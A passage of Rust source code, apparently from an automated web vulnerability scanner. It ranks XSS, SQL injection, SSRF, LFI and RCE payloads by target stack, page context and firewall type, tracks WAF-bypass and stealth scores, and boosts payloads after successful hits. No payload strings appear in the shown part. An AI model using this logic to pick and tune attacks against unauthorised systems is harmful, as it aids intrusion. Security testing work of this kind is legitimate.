                context: vec!["input".to_string()],
                stealth_level: 0.68,
                waf_bypass_prob: 0.62,
                severity: Severity::Critical,
                detection: DetectionMethod::RceConfirm,
                base_weight: 0.65,
                success_count: 0,
                fail_count: 0,
            },
        ]);
        
        // Adicionar mais categorias aqui (SqliBlind, SqliUnion, etc.)
        // Por brevidade, continuo com as principais...
        
        map
    }
    
    pub fn get_top_payloads_parallel(
        &self,
        tech_stack: &[String],
        page_context: &[String],
        waf_type: &str,
        limit: usize,
    ) -> Vec<Payload> {
        let waf_profile = self.waf_profiles.get(waf_type).unwrap_or_else(|| self.waf_profiles.get("unknown").unwrap());
        let bypass_mult = waf_profile.bypass_multiplier;
        
        let mut relevant_categories = std::collections::HashSet::new();
        for stack in tech_stack {
            if let Some(cats) = self.context_matrix.get(stack) {
                for cat in cats {
                    relevant_categories.insert(cat.clone());
                }
            }
        }
        
        if relevant_categories.is_empty() {
            relevant_categories.insert(PayloadCategory::XssReflected);
            relevant_categories.insert(PayloadCategory::SqliRaw);
            relevant_categories.insert(PayloadCategory::Ssrf);
            relevant_categories.insert(PayloadCategory::Lfi);
        }
        
        let mut candidates: Vec<(f64, &Payload)> = self.payloads
            .par_iter()
            .flat_map(|(category, payloads)| {
                let category_match = relevant_categories.contains(category);
                payloads.par_iter()
                    .map(|p| {
                        let mut weight = p.base_weight;
                        
                        if category_match {
                            weight *= 1.5;
                        }
                        
                        let context_overlap: usize = p.context.iter()
                            .filter(|c| page_context.contains(c))
                            .count();
                        
                        if context_overlap > 0 {
                            weight *= 1.0 + 0.15 * context_overlap as f64;
                        }
                        
                        weight *= bypass_mult;
                        
                        if p.success_count > 0 {
                            let success_rate = p.success_count as f64 / (p.success_count + p.fail_count) as f64;
                            weight *= 1.0 + success_rate;
                        }
                        
                        (weight, p)
                    })
                    .collect::<Vec<_>>()
            })
            .collect();
        
        candidates.par_sort_unstable_by(|a, b| b.0.partial_cmp(&a.0).unwrap());
        
        candidates.into_iter()
            .take(limit)
            .map(|(_, p)| p.clone())
            .collect()
    }
    
    pub fn update_weight(&mut self, payload_id: &str, success: bool) -> bool {
        for payloads in self.payloads.values_mut() {
            for p in payloads {
                if p.id == payload_id {
                    if success {
                        p.success_count += 1;
                        p.base_weight = (p.base_weight + 0.05).min(1.0);
                    } else {
                        p.fail_count += 1;
                        p.base_weight = (p.base_weight - 0.02).max(0.1);
                    }
                    
                    self.execution_history.push(PayloadExecutionRecord {
                        payload_id: payload_id.to_string(),
                        success,
                        timestamp: std::time::SystemTime::now()
                            .duration_since(std::time::UNIX_EPOCH)
                            .unwrap()
                            .as_secs(),
                        target_context: String::new(),
                    });
                    
                    return true;
                }
            }
        }
        false
    }
    
    pub fn get_evasion_techniques(&self, waf_type: &str) -> Vec<String> {
        self.waf_profiles
            .get(waf_type)
            .unwrap_or_else(|| self.waf_profiles.get("unknown").unwrap())
            .techniques
            .clone()
    }
    
    pub fn get_total_count(&self) -> usize {
        self.payloads.values().map(|v| v.len()).sum()
    }
    
    pub fn generate_report(&self) -> PayloadReport {
        let mut by_category = std::collections::HashMap::new();
        for (cat, payloads) in &self.payloads {
            by_category.insert(format!("{:?}", cat), payloads.len());
        }
        
        let mut top_success: Vec<(&str, u32, u32)> = self.payloads
            .values()
            .flat_map(|v| v.iter())
            .filter(|p| p.success_count > 0)
            .map(|p| (p.id.as_str(), p.success_count, p.fail_count))
            .collect();
        
        top_success.sort_by(|a, b| b.1.cmp(&a.1));
        
        PayloadReport {
            total_payloads: self.get_total_count(),
            categories: self.payloads.len(),
            by_category,
            tech_stacks_mapped: self.context_matrix.len(),
            waf_profiles: self.waf_profiles.len(),
            top_successful: top_success.into_iter().take(10).map(|(id, s, f)| (id.to_string(), s, f)).collect(),
            execution_history_count: self.execution_history.len(),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadReport {
    pub total_payloads: usize,
    pub categories: usize,
    pub by_category: std::collections::HashMap<String, usize>,
    pub tech_stacks_mapped: usize,
    pub waf_profiles: usize,
    pub top_successful: Vec<(String, u32, u32)>,
    pub execution_history_count: usize,
}

impl Default for PayloadDictionary {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_get_top_payloads() {
        let dict = PayloadDictionary::new();
        let tech_stack = vec!["express".to_string()];
        let page_context = vec!["input".to_string(), "url_param".to_string()];
        
        let top = dict.get_top_payloads_parallel(&tech_stack, &page_context, "unknown", 5);
        assert!(!top.is_empty());
        assert!(top.len() <= 5);
    }
    
    #[test]
    fn test_update_weight() {
        let mut dict = PayloadDictionary::new();
        let result = dict.update_weight("xr01", true);
        assert!(result);
        
        let top = dict.get_top_payloads_parallel(&[], &[], "unknown", 5);
        let xr01_found = top.iter().any(|p| p.id == "xr01");
        assert!(xr01_found);
    }
}